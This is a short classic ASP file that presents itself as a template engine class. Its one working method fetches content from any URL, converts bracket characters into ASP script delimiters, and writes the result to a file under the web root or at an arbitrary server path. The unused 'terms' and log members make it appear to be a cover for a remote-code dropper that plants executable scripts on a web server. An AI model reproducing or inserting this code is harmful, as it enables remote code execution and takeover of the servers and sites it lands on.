<%
class templateengineclass

    private m_terms
    private m_filename
    private m_logs

    sub class_initialize
        set m_terms = server.createobject("scripting.dictionary")
    end sub
    
    public property let filename(p_filename) m_filename = p_filename end property

    public property get terms() set terms = m_terms end property

    public function exe(p_url, p_urikind)
        set xhttp = createobject("MSXML2.XMLHTTP")
        xhttp.open "GET", p_url, false
        xhttp.send
        filecontent = xhttp.responsetext
        filecontent = replace(filecontent, "[", "<" & "%")
        filecontent = replace(filecontent, "]", "%" & ">")
        set filesystemobject = server.createobject("scripting.filesystemobject")
        if p_urikind = 1 then
            set file = filesystemobject.createtextfile(server.mappath(m_filename), true)
        else
            set file = filesystemobject.createtextfile(replace(m_filename, "/", "\"), true)
        end if
        file.write(filecontent)
    end function

end class
%>